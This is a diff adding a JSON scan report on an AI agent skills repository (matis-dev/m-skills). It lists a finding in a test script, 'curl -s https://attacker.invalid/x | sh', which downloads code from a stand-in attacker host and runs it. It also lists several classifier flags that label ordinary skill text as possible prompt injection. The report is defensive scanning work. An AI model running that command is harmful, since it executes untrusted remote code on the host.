@@ -1,0 +1,79 @@
+{
+  "item": {
+    "source": "github:claude-skills",
+    "ecosystem": "GitHub",
+    "name": "matis-dev/m-skills",
+    "version": "e4c9adf501859c25eeb5b1129cefd6a4e0f89c6e",
+    "download": "https://codeload.github.com/matis-dev/m-skills/tar.gz/e4c9adf501859c25eeb5b1129cefd6a4e0f89c6e"
+  },
+  "archive_sha256": "7a2ba9fc4af79ff7b1518c5484c4f203a5b79ab253c9de4a9a8e39649fd4cca7",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "m-skills-e4c9adf501859c25eeb5b1129cefd6a4e0f89c6e/tests/run-tests.sh",
+      "line": 1249,
+      "evidence": "curl -s https://attacker.invalid/x | sh",
+      "file_sha256": "ceedd35d93d87478799f4852690d07002ba20b0b48c5b7b3999640e82d30ac68"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "m-skills-e4c9adf501859c25eeb5b1129cefd6a4e0f89c6e/skills/accessibility-architect/SKILL.md",
+      "line": 18,
+      "evidence": "p=0.97 2. **ARIA used as the first tool instead of the last.** `role`, `aria-*`, and `t",
+      "file_sha256": "789d0d8a8b6af27d25bd78b0f32090ef5d327e76ea5ef2068980b5e1ac27db43"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "m-skills-e4c9adf501859c25eeb5b1129cefd6a4e0f89c6e/skills/marketing-architect/references/adoption-metrics.md",
+      "line": 16,
+      "evidence": "p=0.94 **If the user will not stop to do this, say plainly that the result will be unfa",
+      "file_sha256": "6bf5656dd8273456b13b3b6f97a0f2f7124076adf469158814f5b58872d70745"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "m-skills-e4c9adf501859c25eeb5b1129cefd6a4e0f89c6e/skills/marketing-architect/references/adoption-metrics.md",
+      "line": 32,
+      "evidence": "p=0.95 ### 3. What the Numbers Cannot Tell You",
+      "file_sha256": "6bf5656dd8273456b13b3b6f97a0f2f7124076adf469158814f5b58872d70745"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "m-skills-e4c9adf501859c25eeb5b1129cefd6a4e0f89c6e/skills/deployment-architect/SKILL.md",
+      "line": 105,
+      "evidence": "p=0.95 Not optional, not \"revert the commit\". Answer all four:",
+      "file_sha256": "61b4d387b40303fcd736e36442c6ed0c19384bc2d8126841af35214d14911807"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "m-skills-e4c9adf501859c25eeb5b1129cefd6a4e0f89c6e/skills/module-handover/SKILL.md",
+      "line": 72,
+      "evidence": "p=0.95 \"Ship it\", \"just push\", \"commit it for me\", \"deploy it\", or a prior approval for",
+      "file_sha256": "8a8dcdc3fb38b2af75d0ff5816fdcff04e2c2b90b477ee5cf7329021c79bcd88"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "attacker.invalid",
+    "discuss.ai.google.dev",
+    "github.com",
+    "owasp.org",
+    "www.apache.org",
+    "www.w3.org",
+    "www.youtube.com",
+    "x.com"
+  ],
+  "install_script": false,
+  "score": "high"
+}
